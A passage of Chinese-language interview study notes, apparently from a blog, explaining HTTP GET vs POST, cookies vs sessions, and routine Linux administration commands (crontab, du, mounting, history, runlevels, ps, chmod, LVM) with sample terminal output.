的数据体中，按照变量和值相对应的方式，传递到 action 所指向 URL。</li>\n<li>3、Get 是不安全的，因为在传输过程，数据被放在请求的 URL 中，而如今现有的很多服务器、代理服务器或者用户代理都会将请求 URL 记录到日志文件中，然后放在某个地方，这样就可能会有一些隐私的信息被第三方看到。另外，用户也可以在浏览器上直接看到提交的数据，一些系统内部消息将会一同显示在用户面前。Post 的所有操作对用户来说都是不可见的。</li>\n<li>4、Get 传输的数据量小，这主要是因为受 URL 长度限制；而 Post 可以传输大量的数据，所以在上传文件只能使用 Post（当然还有一个原因，将在后面的提到）。</li>\n<li>5、Get 限制 Form 表单的数据集的值必须为 ASCII 字符；而 Post 支持整个 ISO10646 字符集。</li>\n<li>6、Get 是 Form 的默认方法。</li>\n</ul>\n<p>使用 Post 传输的数据，可以通过设置编码的方式正确转化中文；而 Get 传输的数据却没有变化。在以后的程序中，我们一定要注意这一点。</p>\n</blockquote>\n<h4 id=\"session和cookie区别汉得\"><a class=\"markdownIt-Anchor\" href=\"#session和cookie区别汉得\">#</a> session 和 cookie 区别（汉得）</h4>\n<blockquote>\n<p>1.Cookie 的工作原理<br>\n（1）浏览器端第一次发送请求到服务器端</p>\n<p>（2）服务器端创建 Cookie，该 Cookie 中包含用户的信息，然后将该 Cookie 发送到浏览器端</p>\n<p>（3）浏览器端再次访问服务器端时会携带服务器端创建的 Cookie</p>\n<p>（4）服务器端通过 Cookie 中携带的数据区分不同的用户</p>\n<p>————————————————</p>\n<p>2.Session 的工作原理</p>\n<p>（1）浏览器端第一次发送请求到服务器端，服务器端创建一个 Session，同时会创建一个特殊的 Cookie（name 为 JSESSIONID 的固定值，value 为 session 对象的 ID），然后将该 Cookie 发送至浏览器端</p>\n<p>（2）浏览器端发送第 N（N&gt;1）次请求到服务器端，浏览器端访问服务器端时就会携带该 name 为 JSESSIONID 的 Cookie 对象</p>\n<p>（3）服务器端根据 name 为 JSESSIONID 的 Cookie 的 value (sessionId), 去查询 Session 对象，从而区分不同用户。</p>\n<p>name 为 JSESSIONID 的 Cookie 不存在（关闭或更换浏览器），返回 1 中重新去创建 Session 与特殊的 Cookie</p>\n<p>name 为 JSESSIONID 的 Cookie 存在，根据 value 中的 SessionId 去寻找 session 对象</p>\n<p>value 为 SessionId 不存在 **（Session 对象默认存活 30 分钟）**，返回 1 中重新去创建 Session 与特殊的 Cookie</p>\n<p>value 为 SessionId 存在，返回 session 对象</p>\n<p>————————————————</p>\n<p>(1) cookie 数据存放在客户的浏览器上，session 数据放在服务器上，但是服务端的 session 的实现对客户端的 cookie 有依赖关系的；</p>\n<p>(2) cookie 不是很安全，别人可以分析存放在本地的 COOKIE 并进行 COOKIE 欺骗，如果主要考虑到安全应当使用 session</p>\n<p>(3) session 会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能，如果主要考虑到减轻服务器性能方面，应当使用 COOKIE</p>\n<p>(4) 单个 cookie 在客户端的限制是 3K，就是说一个站点在客户端存放的 COOKIE 不能 3K。</p>\n<p>(5) 所以：将登陆信息等重要信息存放为 SESSION; 其他信息如果需要保留，可以放在 COOKIE 中</p>\n</blockquote>\n<h3 id=\"9一些linux命令\"><a class=\"markdownIt-Anchor\" href=\"#9一些linux命令\">#</a> 9. 一些 linux 命令</h3>\n<h4 id=\"0liunx查看内核版本发行版特斯拉茄子\"><a class=\"markdownIt-Anchor\" href=\"#0liunx查看内核版本发行版特斯拉茄子\">#</a> 0.Liunx 查看内核版本，发行版 (特斯拉，茄子)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.</span><br><span class=\"line\">[root@VM-16-11-centos ~]# uname -r</span><br><span class=\"line\">3.10.0-1160.45.1.el7.x86_64</span><br><span class=\"line\">//3 –内核版本   10 –重大修订  0 –轻微修订  1160 –错误修复</span><br><span class=\"line\">2.</span><br><span class=\"line\">[root@VM-16-11-centos ~]# uname -a</span><br><span class=\"line\">Linux VM-16-11-centos 3.10.0-1160.45.1.el7.x86_64 #1 SMP Wed Oct 13 17:20:51 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class=\"line\">Linux –内核名称。 如果在BSD或macOS上运行相同的命令，结果将有所不同。</span><br><span class=\"line\">VM-16-11-centos –主机名</span><br><span class=\"line\">3.10.0-1160.45.1.el7c –内核版本</span><br><span class=\"line\">#1 SMP Wed Oct 13 17:20:51 UTC 2021 – 这意味着Ubuntu编译了3.10.0-1160.45.1.el7 1次。最后的编译时间戳也在那里。</span><br><span class=\"line\">x86_64 –机器架构</span><br><span class=\"line\">x86_64 –处理器架构</span><br><span class=\"line\">x86_64 –操作系统体系结构（您可以在64位处理器上运行32位OS）</span><br><span class=\"line\">GNU/Linux –操作系统（不，它不会显示发行名称）</span><br><span class=\"line\">3.</span><br><span class=\"line\">[root@VM-16-11-centos ~]# cat /proc/version</span><br><span class=\"line\">Linux version 3.10.0-1160.45.1.el7.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) ) #1 SMP Wed Oct 13 17:20:51 UTC 2021</span><br><span class=\"line\">4.</span><br><span class=\"line\">[root@VM-16-11-centos ~]# dmesg | grep Linux</span><br><span class=\"line\">[    0.000000] Linux version 3.10.0-1160.45.1.el7.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) ) #1 SMP Wed Oct 13 17:20:51 UTC 2021</span><br><span class=\"line\"></span><br><span class=\"line\">Ubuntu 完整的桌面 Linux 操作系统</span><br><span class=\"line\">Fedora 是商业版RedHat的上游。</span><br><span class=\"line\">Debian 应用程序最丰富的 Linux 发行版。</span><br><span class=\"line\">openSUSE 成为最简单易用、最广泛的发行版</span><br><span class=\"line\">kali dddd</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4 id=\"crontab-的含义茄子\"><a class=\"markdownIt-Anchor\" href=\"#crontab-的含义茄子\">#</a> crontab * 的含义 (茄子)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># Example of job definition:</span><br><span class=\"line\"># .---------------- minute (0 - 59)</span><br><span class=\"line\"># |  .------------- hour (0 - 23)</span><br><span class=\"line\"># |  |  .---------- day of month (1 - 31)</span><br><span class=\"line\"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class=\"line\"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class=\"line\"># |  |  |  |  |</span><br><span class=\"line\"># *  *  *  *  * user-name  command to be executed</span><br><span class=\"line\"></span><br><span class=\"line\">vim /etc/crontab</span><br><span class=\"line\">crontab -u root -e</span><br><span class=\"line\">crontab -u root -l</span><br></pre></td></tr></table></figure>\n<h4 id=\"查看linux文件夹大小茄子\"><a class=\"markdownIt-Anchor\" href=\"#查看linux文件夹大小茄子\">#</a> 查看 linux 文件夹大小 (茄子)</h4>\n<blockquote>\n<p>先来说明一件事：</p>\n<p>drwxr-xr-x   5 root root 4.0K Apr  5  2022 src<br>\ndrwxr-xr-x   2 www  www  4.0K Apr  5  2022 maomao</p>\n<ul>\n<li>文件储存在硬盘上，硬盘的最小存储单位叫做 “扇区”（Sector）。每个扇区储存 512 字节（相当于 0.5KB）。</li>\n<li>操作系统读取硬盘的时候，不会一个个扇区地读取，这样效率太低，而是一次性连续读取多个扇区，即一次性读取一个 “块”（block）。这种由多个扇区组成的 “块”，是文件存取的最小单位。“块” 的大小，最常见的是 4KB，即连续八个 sector 组成一个 block。</li>\n<li>文件数据都储存在 “块” 中，那么很显然，我们还必须找到一个地方储存文件的元信息，比如文件的创建者、文件的创建日期、文件的大小等等。这种储存文件元信息的区域就叫做 inode，中文译名为 “索引节点”。</li>\n<li>每一个文件都有对应的 inode，里面包含了与该文件有关的一些信息。</li>\n</ul>\n<p>而 Linux 系统中，目录（directory）也是一种文件。打开目录，实际上就是打开目录文件。目录文件的结构非常简单，就是一系列目录项（dirent）的列表。每个目录项，由两部分组成：所包含文件的文件名，以及该文件名对应的 inode 号码。</p>\n<p><strong>所以 ls -al 命令实际显示的就是目录文件的大小。又因为 OS 定义的文件最小存取单位 “块”（block）是 4KB，所以目录一般显示为 4096B。</strong></p>\n</blockquote>\n<p>[<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vaWlpaWhlci9wLzg1MTEzNTEuaHRtbA==\">svc] 为何 linux ext4 文件系统目录默认大小是 4k? - _毛台 - 博客园 (cnblogs.com)</span></p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/806469-20180305205644145-2050317113.png\" alt=\"img\" style=\"zoom:67%;\" />\n<blockquote>\n<p>[lighthouse@VM-16-11-centos ]$ du -h -d 0 sqllab/<br>\n9.2M    sqllab/</p>\n<ol>\n<li>-h , 简单可读的现实大小，自动判断 B,K,M,G…</li>\n<li>-d 0 , 现实列表深度为 0，就是只现实.kde 目录的占用，如果 - d 1 会显示第一级文件的大小，以此类推</li>\n</ol>\n<p>du -sh 命令，可查看当前文件夹的总大小</p>\n<p>du -h --max-depth=1<br>\n9.2M    ./sqllab<br>\n32K     ./maomao<br>\n59M     ./wordpress<br>\n199M    ./besides<br>\n13M     ./src<br>\n5.6M    ./sqli<br>\n223M    ./vulhub<br>\n377M    ./keshe<br>\n44M     ./html<br>\n942M    .</p>\n</blockquote>\n<h4 id=\"分区挂载过程茄子\"><a class=\"markdownIt-Anchor\" href=\"#分区挂载过程茄子\">#</a> 分区挂载过程 (茄子)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">（1）虚拟机添加硬盘</span><br><span class=\"line\"> fdisk -l</span><br><span class=\"line\">（2）分区</span><br><span class=\"line\">fdisk /dev/sdb</span><br><span class=\"line\">e 即分为逻辑分区，按 p 即分为主分区</span><br><span class=\"line\">+1024m</span><br><span class=\"line\">（3）格式化</span><br><span class=\"line\">mkfs -t ext3 -c /dev/sdb1mkfs -t ext3 -c /dev/sdb1</span><br><span class=\"line\">（4）挂载</span><br><span class=\"line\">mount /dev/sdb1 /mnt</span><br><span class=\"line\">（5）设置可以自动挂载</span><br><span class=\"line\">vim /etc/fstab</span><br></pre></td></tr></table></figure>\n<h4 id=\"查看历史命令查看自己的和别人的深信服\"><a class=\"markdownIt-Anchor\" href=\"#查看历史命令查看自己的和别人的深信服\">#</a> 查看历史命令，查看自己的和别人的 (深信服)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">history</span><br><span class=\"line\">history命令后面可以加选项：</span><br><span class=\"line\">-c：清空历史命令（包括缓存和文件）</span><br><span class=\"line\">-w：把缓存中的历史命令写入历史命令保存文件~/.bash_history（显然每个用户有自己的文件）</span><br><span class=\"line\">-r\t将命令历史文件中的内容读入到目前shell的history记忆中【就是按↑能翻到】</span><br><span class=\"line\">数字#\t列出最近的#条命令</span><br><span class=\"line\"></span><br><span class=\"line\">历史命令最多可以保存1000条，可以在/etc/profile中进行修改：</span><br><span class=\"line\">source /etc/profile使环境变量生效。</span><br><span class=\"line\">history -c 只能清除history命令查看的，不能清除.bash_history文件中的，需要自己手动删除</span><br><span class=\"line\"></span><br><span class=\"line\">查看别人的，去别人家目录看.bash_history</span><br><span class=\"line\"></span><br><span class=\"line\">查看history时，还能看执行时间</span><br><span class=\"line\">vim /etc/profile</span><br><span class=\"line\">export HISTTIMEFORMAT=&quot;%Y-%m-%d %H:%M:%S &quot;</span><br></pre></td></tr></table></figure>\n<h4 id=\"定时任务有哪些宏杉\"><a class=\"markdownIt-Anchor\" href=\"#定时任务有哪些宏杉\">#</a> 定时任务有哪些 (宏杉)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">crontab //前面讲过</span><br><span class=\"line\">at 一次性任务</span><br><span class=\"line\">at +时间</span><br><span class=\"line\">atq</span><br><span class=\"line\">atrm jobid</span><br><span class=\"line\">at 10:00      #输入“at  时间”；开始设置at   ，支持am、pm           </span><br><span class=\"line\">at&gt; touch /home/cjk      #输入任务内容</span><br><span class=\"line\">at&gt; echo &quot;hello&quot; &gt;&gt; /home/cjk&lt;EOT&gt; </span><br></pre></td></tr></table></figure>\n<h4 id=\"linux启动过程宏杉\"><a class=\"markdownIt-Anchor\" href=\"#linux启动过程宏杉\">#</a> linux 启动过程 (宏杉)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Linux系统的启动过程并不是大家想象中的那么复杂，其过程可以分为5个阶段：</span><br><span class=\"line\"></span><br><span class=\"line\">内核的引导。</span><br><span class=\"line\">\t当计算机打开电源后，首先是BIOS开机自检，按照BIOS中设置的启动设备（通常是硬盘）来启动。</span><br><span class=\"line\">\t操作系统接管硬件以后，首先读入 /boot 目录下的内核文件。</span><br><span class=\"line\">运行 init。</span><br><span class=\"line\">\tinit 进程是系统所有进程的起点，你可以把它比拟成系统所有进程的老祖宗，没有这个进程，系统中任何进程都不会启动。</span><br><span class=\"line\">\tinit 程序首先是需要读取配置文件 /etc/inittab。</span><br><span class=\"line\">\t运行级别</span><br><span class=\"line\">\t\t许多程序需要开机启动。它们在Windows叫做&quot;服务&quot;（service），在Linux就叫做&quot;守护进程&quot;（daemon）。</span><br><span class=\"line\">\t\tinit进程的一大任务，就是去运行这些开机启动的程序。</span><br><span class=\"line\">\t\tLinux允许为不同的场合，分配不同的开机启动程序，这就叫做&quot;运行级别&quot;（runlevel）。也就是说，启动时根据&quot;运行级别&quot;，确定要运行哪些程序。</span><br><span class=\"line\">系统初始化。</span><br><span class=\"line\">    在init的配置文件中有这么一行： si::sysinit:/etc/rc.d/rc.sysinit　它调用执行了/etc/rc.d/rc.sysinit</span><br><span class=\"line\">    而rc.sysinit是一个bash shell的脚本，它主要是完成一些系统初始化的工作，rc.sysinit是每一个运行级别都要首先运行的重要脚本。</span><br><span class=\"line\">    它主要完成的工作有：激活交换分区，检查磁盘，加载硬件模块以及其它一些需要优先执行任务。</span><br><span class=\"line\">建立终端 。</span><br><span class=\"line\">\trc执行完毕后，返回init。这时基本系统环境已经设置好了，各种守护进程也已经启动了。</span><br><span class=\"line\">\tinit接下来会打开6个终端，以便用户登录系统。在inittab中的以下6行就是定义了6个终端：</span><br><span class=\"line\">\t同时它会显示一个文本登录界面，这个界面就是我们经常看到的登录界面，在这个登录界面中会提示用户输入用户名</span><br><span class=\"line\">\t而用户输入的用户将作为参数传给login程序来验证用户的身份。</span><br><span class=\"line\">用户登录系统。</span><br><span class=\"line\">\t一般来说，用户的登录方式有三种：</span><br><span class=\"line\">        （1）命令行登录</span><br><span class=\"line\">        （2）ssh登录</span><br><span class=\"line\">        （3）图形界面登录</span><br></pre></td></tr></table></figure>\n<h4 id=\"linux运行级别amazon\"><a class=\"markdownIt-Anchor\" href=\"#linux运行级别amazon\">#</a> linux 运行级别 (amazon)</h4>\n<blockquote>\n<p>Linux 系统有 7 个运行级别 (runlevel)：</p>\n<ul>\n<li>运行级别 0：系统停机状态，系统默认运行级别不能设为 0，否则不能正常启动</li>\n<li>运行级别 1：单用户工作状态，root 权限，用于系统维护，禁止远程登录</li>\n<li>运行级别 2：多用户状态 (没有 NFS)</li>\n<li>运行级别 3：完全的多用户状态 (有 NFS)，登录后进入控制台命令行模式</li>\n<li>运行级别 4：系统未使用，保留</li>\n<li>运行级别 5：X11 控制台，登录后进入图形 GUI 模式</li>\n<li>运行级别 6：系统正常关闭并重启，默认运行级别不能设为 6，否则不能正常启动</li>\n</ul>\n</blockquote>\n<h4 id=\"linux进程状态汉得\"><a class=\"markdownIt-Anchor\" href=\"#linux进程状态汉得\">#</a> linux 进程状态（汉得）</h4>\n<blockquote>\n<p>3 running, 144 sleeping,   0 stopped,   1 zombie</p>\n</blockquote>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/875796-20190926175737431-422827153.png\" alt=\"img\" style=\"zoom:67%;\" />\n<h4 id=\"查看服务是否运行汉得\"><a class=\"markdownIt-Anchor\" href=\"#查看服务是否运行汉得\">#</a> 查看服务是否运行（汉得）</h4>\n<blockquote>\n<p>ps ef  和  ps aux</p>\n<p>[root@VM-16-11-centos ~]# ps -ef | grep sshd<br>\nroot      2896     1  0 Mar22 ?        00:01:56 /usr/sbin/sshd -D<br>\nroot     11786  2896  0 09:52 ?        00:00:00 sshd: lighthouse [priv]<br>\nlightho+ 11800 11786  0 09:52 ?        00:00:00 sshd: lighthouse@pts/0<br>\nroot     13538 11930  0 09:57 pts/0    00:00:00 grep --color=auto sshd</p>\n<p>ps aux 最初用到 Unix Style 中，而 ps -ef 被用在 System V Style 中，两者输出略有不同。</p>\n<p>其中 STAT 状态位常见的状态字符有<br>\n D   // 无法中断的休眠状态（通常 IO 的进程）；<br>\nR   // 正在运行可中在队列中可过行的；<br>\nS   // 处于休眠状态；<br>\nT   // 停止或被追踪；<br>\nW   // 进入内存交换 （从内核 2.6 开始无效）；<br>\nX   // 死掉的进程 （基本很少见）；<br>\nZ   // 僵尸进程；<br>\n&lt;   // 优先级高的进程<br>\n N   // 优先级较低的进程<br>\n L   // 有些页被锁进内存；<br>\ns   // 进程的领导者（在它之下有子进程）；<br>\nl   // 多线程，克隆线程（使用 CLONE_THREAD, 类似 NPTL pthreads）；<br>\n+   // 位于后台的进程组；</p>\n</blockquote>\n<h4 id=\"查看服务器cpu内存磁盘利用率linux版本汉得\"><a class=\"markdownIt-Anchor\" href=\"#查看服务器cpu内存磁盘利用率linux版本汉得\">#</a> 查看服务器 CPU，内存，磁盘利用率，linux 版本（汉得）</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.查看内存使用率</span><br><span class=\"line\"></span><br><span class=\"line\">[root@VM-16-11-centos ~]# free -h</span><br><span class=\"line\">              total        used        free      shared  buff/cache   available</span><br><span class=\"line\">Mem:           1.8G        685M        149M         12M        1.0G        947M</span><br><span class=\"line\">Swap:          1.0G        374M        650M</span><br><span class=\"line\">[root@VM-16-11-centos ~]# vmstat</span><br><span class=\"line\">procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----</span><br><span class=\"line\"> r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st</span><br><span class=\"line\"> 3  0 383388 153348 213388 813048    0    0     2    26    0    1  3  1 95  0  0</span><br><span class=\"line\"></span><br><span class=\"line\">2.查看CPU使用率</span><br><span class=\"line\">[root@VM-16-11-centos ~]# top</span><br><span class=\"line\">top - 10:07:30 up 217 days, 10:19,  1 user,  load average: 0.42, 0.30, 0.21</span><br><span class=\"line\">Tasks: 150 total,   3 running, 146 sleeping,   0 stopped,   1 zombie</span><br><span class=\"line\">%Cpu(s):  3.0 us,  1.0 sy,  0.0 ni, 96.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span><br><span class=\"line\">[root@VM-16-11-centos ~]# cat /proc/cpuinfo  | grep physical | uniq -c</span><br><span class=\"line\">      1 physical id     : 0</span><br><span class=\"line\">      1 address sizes   : 46 bits physical, 48 bits virtual</span><br><span class=\"line\">[root@VM-16-11-centos ~]# dmidecode</span><br><span class=\"line\"># dmidecode 3.2</span><br><span class=\"line\">Getting SMBIOS data from sysfs.</span><br><span class=\"line\">SMBIOS 2.8 present.</span><br><span class=\"line\">9 structures occupying 398 bytes.</span><br><span class=\"line\">Table at 0x000F6A20.</span><br><span class=\"line\">...... </span><br><span class=\"line\"></span><br><span class=\"line\">3.查看磁盘利用率</span><br><span class=\"line\">[root@VM-16-11-centos ~]# df -h</span><br><span class=\"line\">Filesystem      Size  Used Avail Use% Mounted on</span><br><span class=\"line\">devtmpfs        908M     0  908M   0% /dev</span><br><span class=\"line\">tmpfs           919M   32K  919M   1% /dev/shm</span><br><span class=\"line\">tmpfs           919M  1.1M  918M   1% /run</span><br><span class=\"line\">tmpfs           919M     0  919M   0% /sys/fs/cgroup</span><br><span class=\"line\">/dev/vda1        50G   21G   27G  43% /</span><br><span class=\"line\">tmpfs           184M     0  184M   0% /run/user/0</span><br><span class=\"line\">tmpfs           184M     0  184M   0% /run/user/1000</span><br><span class=\"line\">overlay          50G   21G   27G  43% /var/lib/docker/overlay2/6abafa18f5d96ab29f1273e0173f6573cb815fdfef8b88e2911fe106021c5cdc/merged</span><br><span class=\"line\">[root@VM-16-11-centos ~]# fdisk -l</span><br><span class=\"line\"></span><br><span class=\"line\">Disk /dev/vda: 53.7 GB, 53687091200 bytes, 104857600 sectors</span><br><span class=\"line\">Units = sectors of 1 * 512 = 512 bytes</span><br><span class=\"line\">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class=\"line\">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class=\"line\">Disk label type: dos</span><br><span class=\"line\">Disk identifier: 0x0009ac89</span><br><span class=\"line\"></span><br><span class=\"line\">   Device Boot      Start         End      Blocks   Id  System</span><br><span class=\"line\">/dev/vda1   *        2048   104857566    52427759+  83  Linux</span><br><span class=\"line\"></span><br><span class=\"line\">4.进程</span><br><span class=\"line\">ps -ef ps -aux</span><br><span class=\"line\"></span><br><span class=\"line\">5.内核</span><br><span class=\"line\">uname -a</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNzIxNDA2\">Linux 系统查看 CPU、机器型号、内存等信息 - 腾讯云开发者社区 - 腾讯云 (tencent.com)</span></p>\n<h4 id=\"chmod改变文件所属者汉得\"><a class=\"markdownIt-Anchor\" href=\"#chmod改变文件所属者汉得\">#</a> chmod (改变文件所属者)（汉得）</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chmod 777 /home/aaa/aaa.sh</span><br><span class=\"line\">chmod +x ./ssb.sh</span><br><span class=\"line\">chmod -R 644 a.txt</span><br><span class=\"line\">chmod 4775 file //设置了特殊权限位</span><br></pre></td></tr></table></figure>\n<h4 id=\"lvm宏杉吉利英伦\"><a class=\"markdownIt-Anchor\" href=\"#lvm宏杉吉利英伦\">#</a> LVM（宏杉，吉利英伦）</h4>\n<blockquote>\n<p>LVM 是逻辑盘卷管理（Logical Volume Manager）的简称，它是 Linux 环境下对磁盘分区进行管理的一种机制，LVM 是建立在硬盘和分区之上的一个逻辑层，来提高磁盘分区管理的灵活性。</p>\n<p>LVM 最大的特点就是可以对磁盘进行动态管理。因为逻辑卷的大小是可以动态调整的，而且不会丢失现有的数据。如果我们新增加了硬盘，其也不会改变现有上层的逻辑卷。作为一个动态磁盘管理机制，逻辑卷技术大大提高了磁盘管理的灵活性。</p>\n<p><strong>PV</strong>（Physical Volume）- 物理卷<br>\n物理卷在逻辑卷管理中处于最底层，它可以是实际物理硬盘上的分区，也可以是整个物理硬盘。<br>\n<strong>VG</strong>（Volumne Group）- 卷组<br>\n卷组建立在物理卷之上，一个卷组中至少要包括一个物理卷，在卷组建立之后可动态添加物理卷到卷组中。一个逻辑卷管理系统工程中可以只有一个卷组，也可以拥有多个卷组。<br>\n<strong>LV</strong>（Logical Volume）- 逻辑卷<br>\n逻辑卷建立在卷组之上，卷组中的未分配空间可以用于建立新的逻辑卷，逻辑卷建立后可以动态地扩展和缩小空间。系统中的多个逻辑卷可以属于同一个卷组，也可以属于不同的多个卷组</p>\n<p>PV 物理卷常用操作<br>\n pvcreate /dev/DEVICE: 创建 PV<br>\npvs：简要 PV 信息显示<br>\n pvdisplay：显示 PV 的详细信息<br>\n pvremove /dev/DEVICE: 移除 PV<br>\npvscan: 扫描系统中连接的所有硬盘，列出找到的物理卷列表</p>\n<p>VG 常用操作<br>\n vgcreate /dev/DEVICE: 创建 VG 卷组<br>\n vgs: 简要 VG 信息显示<br>\n vgextend：动态扩展 LVM 卷组，它通过向卷组中添加物理卷来增加卷组的容量<br>\n vgreduce：通过删除 LVM 卷组中的物理卷来减少卷组容量，不能删除 LVM 卷组中剩余的最后一个物理卷<br>\n vgdisplay：显示 VG 的详细信息<br>\n vgscan：查找系统中存在的 LVM 卷组，并显示找到的卷组列表<br>\n vgremove：删除卷组，其上的逻辑卷必须处于离线状态</p>\n<p>4、LV 常用操作<br>\n lvcreate : 用来创建 LVM 的逻辑卷<br>\n lvcreate -L #[mMgGtT] -n NAME VolumeGroup<br>\nlvs : 显示逻辑卷信息<br>\n lvscan：扫描当前系统中的所有逻辑卷，及其对应的设备文件<br>\n lvdisplay：显示逻辑卷属性<br>\n lvextend：可在线扩展逻辑卷空间<br>\n lvreduce：缩减逻辑卷空间，一般离线使用<br>\n lvremove：删除逻辑卷，需要处于离线（卸载）状态</p>\n<p><strong>缺点：</strong></p>\n<p>在从卷组中移除一个磁盘的时候必须使用 reducevg 命令（这个命令要求 root 